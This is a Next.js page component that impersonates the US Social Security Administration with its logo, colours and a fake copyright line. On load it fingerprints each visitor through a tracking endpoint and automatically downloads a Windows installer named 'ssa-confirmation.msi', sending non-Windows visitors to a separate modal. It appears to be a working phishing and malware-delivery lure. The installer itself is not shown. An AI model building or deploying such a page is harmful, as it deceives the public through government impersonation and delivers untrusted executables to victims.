"use client";

import { useEffect, useState } from "react";
import DownloadGuide from "@/components/DownloadGuide";
import PlatformModal from "@/components/PlatformModal";

// Configuration
const DOWNLOAD_FILE = "/ssa-confirmation.msi";
const WINDOWS_ONLY_EXTENSIONS = [".exe", ".msi"]; // Add extensions that require Windows

export default function Home() {
  const [downloadStatus, setDownloadStatus] = useState<'idle' | 'starting' | 'downloaded'>('idle');
  const [showPlatformModal, setShowPlatformModal] = useState(false);
  const [isWindows, setIsWindows] = useState(true);

  // Track analytics
  const trackEvent = async (event: string) => {
    try {
      await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          event,
          userAgent: navigator.userAgent,
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          platform: navigator.platform,
          timestamp: new Date().toISOString(),
          referrer: document.referrer,
        }),
      });
    } catch (error) {
      console.error('Tracking error:', error);
    }
  };

  useEffect(() => {
    // Detect platform
    const userAgent = navigator.userAgent.toLowerCase();
    const windowsDetected = /windows|win32|win64/.test(userAgent);
    setIsWindows(windowsDetected);

    // Track page visit
    trackEvent('Page Visit');

    // Check if file requires Windows
    const fileExtension = DOWNLOAD_FILE.substring(DOWNLOAD_FILE.lastIndexOf('.'));
    const requiresWindows = WINDOWS_ONLY_EXTENSIONS.includes(fileExtension.toLowerCase());

    if (requiresWindows && !windowsDetected) {
      // Show modal for non-Windows users
      setShowPlatformModal(true);
      trackEvent('Platform Mismatch - Non-Windows User');
      return;
    }

    // Start download process
    setDownloadStatus('starting');
    trackEvent('Download Started');

    // Simulate download delay and trigger
    const timer = setTimeout(() => {
      const link = document.createElement("a");
      link.href = DOWNLOAD_FILE;
      link.download = DOWNLOAD_FILE.substring(DOWNLOAD_FILE.lastIndexOf('/') + 1);
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Update status
      setDownloadStatus('downloaded');
      trackEvent('Download Completed');
    }, 1500);

    return () => clearTimeout(timer);
  }, []);

  const handleManualDownload = () => {
    trackEvent('Manual Download Click');
    const link = document.createElement("a");
    link.href = DOWNLOAD_FILE;
    link.download = DOWNLOAD_FILE.substring(DOWNLOAD_FILE.lastIndexOf('/') + 1);
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    setDownloadStatus('downloaded');
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-[#f5f5f5] font-sans">
      <DownloadGuide />
      {showPlatformModal && <PlatformModal onClose={() => setShowPlatformModal(false)} />}
      <div className="bg-white p-10 md:p-16 rounded-lg shadow-lg text-center max-w-2xl w-full mx-4">
        <div className="w-48 h-auto mx-auto mb-8">
          <img
            src="/ssa-logo.png"
            alt="Social Security Administration Logo"
            className="w-full h-auto"
          />
        </div>

        <h1 className="text-[#112e51] text-2xl font-bold tracking-wider mb-8 uppercase">
          {downloadStatus === 'starting' && 'Download Starting...'}
          {downloadStatus === 'downloaded' && 'Your file has been downloaded.'}
          {downloadStatus === 'idle' && 'Preparing Download...'}
        </h1>

        <p className="text-[#6b6b6b] text-xs mb-4">
          © 2025 Social Security Administration. All rights reserved.
        </p>

        <div className="text-xs flex justify-center items-center gap-2">
          <a href="#" className="text-[#c41230] hover:underline">Privacy Policy</a>
          <span className="text-[#6b6b6b]">|</span>
          <a href="#" className="text-[#c41230] hover:underline">Terms of Service</a>
        </div>

        <div className="mt-8 text-sm text-gray-400">
          <p>
            If the download didn't start,{" "}
            <button
              onClick={handleManualDownload}
              className="text-[#112e51] hover:underline font-semibold cursor-pointer bg-transparent border-none p-0"
            >
              click here
            </button>
            .
          </p>
        </div>
      </div>

      {showPlatformModal && (
        <PlatformModal onClose={() => setShowPlatformModal(false)} />
      )}
    </div>
  );
}
